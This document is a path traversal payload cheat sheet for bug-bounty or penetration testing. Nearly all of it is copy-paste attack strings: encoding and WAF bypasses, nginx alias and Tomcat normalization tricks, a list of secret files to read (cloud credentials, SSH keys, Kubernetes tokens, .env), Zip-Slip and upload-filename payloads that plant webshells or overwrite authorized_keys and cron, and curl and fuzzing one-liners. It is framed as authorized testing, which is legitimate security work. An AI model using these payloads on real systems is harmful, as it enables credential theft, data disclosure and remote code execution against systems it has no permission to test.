# Path / Directory Traversal — Arsenal (copy-paste payloads)

**Author:** x8bitranjit

> Companion to `PATH_TRAVERSAL_TESTING_GUIDE.md`. This kit owns **read-without-include**, **file WRITE (Zip-Slip /
> upload-path / save)**, and **server-normalization** traversal. If the sink **includes/executes** the file → use the
> **`LFI/` kit** (wrapper/log-poison/filter-chain RCE). Send `../` raw with `curl --path-as-is` or Burp (browsers/curl
> collapse it otherwise). Prove **impact** (secret/cross-user read, or out-of-dir write), not a same-dir path change.
> **Authorized testing only; benign marker files; never overwrite real files.**

---

## 0.0 The whole attack in one sequence (DIRECTION decides everything — worked write chain in Guide §12.1)
*Classify the sink DIRECTION first — READ→serve (disclosure) vs WRITE (Zip-Slip/upload/save → RCE, the headline) vs INCLUDE (→ LFI kit). Send `../` RAW. Prove a secret read or an out-of-dir write, never a same-dir change.*

```bash
# 1. CLASSIFY the sink direction (§4.2) — this picks the whole playbook:
#    READ/serve bytes -> disclosure     WRITE a file -> RCE (go to 3)     INCLUDE/execute -> hand to LFI kit

# --- READ path (disclosure) ---
curl --path-as-is "https://T/download?file=../../../../etc/passwd"      # RAW ../ (else collapsed client-side) = Medium proof
#   then the MONEY targets: ../../../../home/app/.env  ~/.aws/credentials  /proc/self/environ  <app>/config  private keys
#   cross-tenant: ../<other-user-id>/file  -> other users' data + session tokens
#   bypass matrix if filtered: ....//  %2e%2e%2f  %252f (double)  %c0%af (overlong)  ..;/ (Tomcat)  /static../ (nginx alias)
#   absolute-path foot-gun (Python/.NET os.path.join/Path.Combine): input=/etc/passwd  (base dir DISCARDED, no ../ needed)

# --- WRITE path (RCE — the headline this kit owns) ---
# 2. find a WRITE sink: import-zip / restore-backup / install-plugin / upload-filename / save-export / log-path
# 3. ZIP-SLIP: build an archive whose ENTRY NAME traverses (poc/zipslip_build.py refuses executable content by default)
python3 poc/zipslip_build.py --entry '../../../../tmp/pt-poc.txt' --content 'benign marker' -o slip.zip
#    upload -> read the marker back OUTSIDE the extract dir = escape proven = Critical (describe the shell)
#    escalate (OWN instance only): --entry '../../../../var/www/html/x.php' --content '<?php ...' --i-own-this-instance
# 4. UPLOAD-FILENAME: multipart filename="../../../../var/www/html/x.php"  |  JSON {"dest":"../../public/x.php"}
# 5. OVERWRITE (no webshell needed): ../../home/app/.ssh/authorized_keys (append key->SSH) | cron | served .js | Jenkinsfile
```
**Cash-out map by DIRECTION:** READ → **secret/source/cross-tenant disclosure → cloud pivot (High, §10/§11)** · WRITE-extract → **Zip-Slip → webshell/overwrite → RCE (Critical, §12)** · WRITE-upload → **filename traversal → webshell (Critical, §13)** · WRITE-save → **overwrite `authorized_keys`/cron → RCE/persistence (Critical, §14)** · `/etc/passwd` only → **traversal proof (Medium)** · INCLUDE → **go to the LFI kit**.

---

## 0. Parameter / source name-set

> **What & when:** these are the "slips" that most often become a filesystem path. Use them at the very start (Phase 0) to find *where* the clerk takes a location from — not just `?file=` query params, but path segments, the multipart `filename`, JSON `path`/`dest` fields, and archive **entry names** (the write-side goldmine hunters usually miss). Spray these against every download, upload, export, and import feature.

```
file  path  download  doc  document  name  filename  fname  page  template  report  img  image  attachment
key  resource  dir  folder  location  src  target  dest  destination  out  output  save  export  log  upload  url
# path segments:  /files/<x>  /download/<x>  /static/<x>  /media/<x>  /api/*/files/<x>
# upload/archive:  multipart filename="...",  JSON {"path"/"dest"/"name":...},  ZIP/TAR entry names
```

---

## 1. Core traversal (read) — Linux

> **What & when:** the "can I make the clerk leave the room?" set for a READ sink on Linux. Fire these first to *confirm* traversal against a file you know exists (`/etc/passwd`). Over-traverse (stack extra `../` — harmless once at root), and if that's filtered, jump to the absolute path or `....//`. Remember: `/etc/passwd` is only your **proof** — once one of these lands, immediately switch to the §6 secret targets.

```
../etc/passwd
../../etc/passwd
../../../../etc/passwd
../../../../../../../../etc/passwd        (over-traverse: extra ../ are harmless at /)
/etc/passwd                                (absolute — CWE-36; skips depth guessing)
....//....//....//etc/passwd               (non-recursive strip bypass — collapses to ../)
..././..././..././etc/passwd
/./././././etc/passwd
file:///etc/passwd
```

## 2. Core traversal (read) — Windows

```
..\..\..\windows\win.ini
..\..\..\..\..\..\windows\win.ini
....\\....\\....\\windows\win.ini
C:\windows\win.ini                          (drive-absolute)
C:\windows\system32\drivers\etc\hosts
\\?\C:\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
file.aspx::$DATA                            (Alternate Data Stream — read .NET source)
web.config
..\..\inetpub\wwwroot\web.config
```

## 3. Encoding & filter bypass

> **What & when:** reach for these when a raw `../` gets blocked — you're *disguising* the same characters so the layer that validates and the layer that decodes disagree. Try single URL-encoding (`..%2f`) when the app decodes server-side; **double-encoding** (`%252e%252e%252f`) when a WAF/CDN sits in front; overlong UTF-8 (`%c0%af`) on legacy IIS. `....//` and `..;/` cover the strip-and-reform and Tomcat cases. Sweep them — it's a small matrix and one usually hits.

```
..%2f..%2f..%2fetc%2fpasswd                 (URL-encoded /)
..%5c..%5c..%5cwin.ini                      (URL-encoded \)
%2e%2e%2f%2e%2e%2fetc%2fpasswd              (encoded dots + slash)
%252e%252e%252fetc%252fpasswd               (double-encoded — beats decode-once/WAF)
..%255c..%255cwin.ini
..%c0%af..%c0%afetc%c0%afpasswd             (overlong UTF-8 / — legacy IIS/Unicode)
..%c1%9c..%c1%9cwin.ini                     (overlong \ )
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%uff0e%uff0e%u2215etc%u2215passwd           (unicode fullwidth dot / division slash)
..%00/etc/passwd                            (null — legacy)
....//                                       (strip-and-reform)
..;/                                         (semicolon path segment — Java/Tomcat)
```

## 4. Prefix / suffix / allowlist bypass

> **What & when:** use when the app *shapes* your input rather than blocking it. If it **prepends a base dir**, you just need enough `../` to climb out (no absolute path needed). If it **appends `.png`/`.pdf`**, the null byte is dead on modern stacks — so pick a target that already ends in that extension, or try legacy path-truncation. If it **allowlists a name**, traverse *from* the allowed name if the code concatenates a subpath. Match the sub-block to the constraint you actually observed.

```
# forced base dir prepended (open(BASE + input)) — just climb out:
../../../../../../etc/passwd
# forced suffix appended (input + ".png"/".pdf"):
../../etc/passwd%00.png                      (legacy null)
../../etc/passwd%00
../../etc/passwd/././././././...             (legacy PHP path truncation — appended ext falls off; pad to 4096+)
# target a file that already ends with the forced extension:
../../../var/log/app.log        (if suffix is .log)     ../../../backup/db.bak   (if .bak)
# allowlist "must contain allowed name" — traverse FROM it:
allowed.txt/../../../../etc/passwd
/var/www/allowed/../../../../etc/passwd
# "must start with /base":
/base/../../../../etc/passwd
```

## 5. Server & framework normalization (test on /static, /assets, etc.)

> **What & when:** try these when the *app* looks locked down — because the leak may be in the **building's plumbing** (web server/proxy/framework), not the code. Always probe `/static../` and friends (nginx `alias` off-by-slash) and `..;/` (Tomcat → `WEB-INF`) against static routes, even with zero app params in play. These reach source, `web.xml`, `.git`, and `.env`. Cite the exact server + version in the report — the fix is config, not code.

```
# nginx alias off-by-slash (location /static { alias /path/static/; }  — NOTE missing trailing slash on location):
/static../
/static../../etc/passwd
/assets../../../etc/passwd
/img../  /media../  /css../  /js../
# Tomcat / Java servlet — semicolon path params reach WEB-INF:
/app/..;/..;/WEB-INF/web.xml
/..;/..;/WEB-INF/classes/application.properties
/;/../WEB-INF/web.xml
# encoded slash not decoded by proxy but decoded by app:
/api/%2e%2e%2f%2e%2e%2fWEB-INF/web.xml
/%2e%2e/%2e%2e/etc/passwd
# .git / backups via server-normalization (source + secrets):
/static../.git/config
/static../.env
/static../../config/database.yml
```

## 6. High-value READ targets (climb here from /etc/passwd — guide §10)

```
Linux app secrets/source:
  .env  config.php  wp-config.php  settings.py  application.yml  application.properties  appsettings.json
  /var/www/<app>/...(source)   database.yml   secrets.yml   docker-compose.yml   .git/config   id_rsa
  ~/.aws/credentials   ~/.ssh/id_rsa   /root/.ssh/id_rsa   /proc/self/environ   /proc/self/cmdline
  /var/run/secrets/kubernetes.io/serviceaccount/token   /run/secrets/*   *.sqlite   *.bak  *.old
Windows:
  web.config   appsettings.json   C:\inetpub\...\web.config   unattend.xml   sysprep.inf
  <app>\connectionStrings.config   IIS logs   .aspx source via ::$DATA
```

## 7. WRITE — Zip-Slip archive entry names (guide §12)

> **What & when:** the Critical-tier block — use whenever a feature **extracts an archive you upload** (import ZIP, restore, theme/plugin install). You're choosing each entry's *name* so the extractor files it outside the unzip folder. **Always prove the escape benignly first** (a marker to `/tmp` you can read back), then *describe* the webshell/`authorized_keys` escalation — only drop a live shell on your own instance. Build the archive with `poc/zipslip_build.py` (it refuses executable content by design).

```
# a benign entry that traverses OUT of the extraction dir (use poc/zipslip_build.py):
../../../../tmp/pt-poc-<rand>.txt                        (safe marker — prove the escape first)
..\..\..\..\Windows\Temp\pt-poc-<rand>.txt              (Windows)
# escalation targets (only on your OWN instance / describe, don't drop live shells on prod):
../../../../var/www/html/pt-<rand>.php
../../../../var/lib/tomcat/webapps/ROOT/pt-<rand>.jsp
../../../../home/<user>/.ssh/authorized_keys            (append your key — RCE/persistence)
../../../../etc/cron.d/pt-<rand>
# tar-specific: an entry that is a SYMLINK to /etc or an ABSOLUTE path (/etc/cron.d/x).
```

## 8. WRITE — upload filename / dest path (guide §13)

> **What & when:** use when *you* control the upload **filename** or a `dest`/`path` field. Put `../` in it to move the written file out of the safe upload dir into the webroot (webshell) — or, often more reliable, **overwrite** a file the app already trusts/serves (a loaded `main.js`, a config). Pair with the **FileUpload kit**: this block gets the file *out of the upload dir*, FileUpload gets it *executable* (extension/MIME/magic-byte bypass).

```
# multipart filename with traversal:
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/pt-<rand>.php"
# JSON/body dest fields:
{"filename":"../../../public/pt-<rand>.php"}
{"path":"../../webroot/pt-<rand>.jsp"}
{"dest":"../../../../home/user/.ssh/authorized_keys"}
?savepath=../../../var/www/html/pt-<rand>.php
# overwrite an existing served/config file (often more reliable than a new drop):
filename="../../../../app/static/main.js"     (overwrite trusted JS → client-side RCE/XSS on all users)
```

## 9. Language foot-guns (absolute path REPLACES the base — no ../ needed)

> **What & when:** the *first* thing to try on a Python, .NET, or Java target — before any `../`. Their "join base + user path" functions **throw the base away** if your input is a complete absolute path, so a bare `/etc/passwd` or `C:\windows\win.ini` reaches the file with no traversal characters at all, sailing past any filter that only hunts for `../`. Cheapest possible win on those stacks.

```
# Python os.path.join(base, user)  and  .NET Path.Combine(base, user):
#   if `user` is ABSOLUTE, the base dir is DISCARDED:
/etc/passwd            (Python: os.path.join('/var/data','/etc/passwd') == '/etc/passwd')
C:\windows\win.ini     (.NET: Path.Combine(@"C:\data", @"C:\windows\win.ini") == the latter)
# so ALWAYS try a plain absolute path on Python/.NET/Java targets before bothering with ../
```

## 10. One-liners (quick confirm)

```bash
# read (MUST use --path-as-is so ../ isn't collapsed):
curl --path-as-is -s "https://target/download?file=../../../../../../etc/passwd" | head
curl --path-as-is -s "https://target/static../../../../etc/passwd" | head           # nginx alias
curl --path-as-is -s "https://target/app/..;/..;/WEB-INF/web.xml"                    # Tomcat

# this kit's tooling:
python3 poc/pt_read_fuzz.py -u "https://target/download?file=FUZZ" --read /etc/passwd --marker "root:x:0:0"
python3 poc/zipslip_build.py --out evil.zip --name "../../../../tmp/pt-poc-9f3.txt" --content "benign-poc"
python3 poc/write_probe.py -u https://target/upload --field filename --marker pt-9f3
```

---

## 11. Confirm-it checklist (don't submit before this)

```
□ You ESCAPED the base dir (reached a file OUTSIDE the intended directory) — not a same-dir path change.
□ You sent ../ RAW (curl --path-as-is / Burp), not collapsed client-side.
□ READ: you reached SECRETS/SOURCE/other-users' files — not just /etc/passwd (which is Medium).
□ WRITE: a BENIGN marker provably landed OUTSIDE the base dir (path shown); escalation described, not destructively done.
□ You classified the sink (read/serve vs write). An INCLUDE/EXECUTE sink → LFI kit, not here.
□ Server-normalization: you cited the exact server/framework (nginx alias / Tomcat ..;/ / IIS) + version if known.
□ Benign markers only; no real file overwritten/deleted; secrets/PII redacted.
```
